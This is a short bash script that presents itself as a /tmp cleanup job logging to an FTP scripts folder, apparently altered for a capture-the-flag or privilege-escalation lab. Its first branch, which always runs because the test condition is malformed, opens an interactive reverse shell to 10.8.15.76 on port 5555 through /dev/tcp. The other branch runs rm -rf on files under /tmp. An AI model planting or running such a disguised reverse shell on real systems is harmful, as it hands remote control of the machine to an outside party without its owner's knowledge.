#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        cd ../../../../../../../../ && bash -i >& /dev/tcp/10.8.15.76/5555 0>&1
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
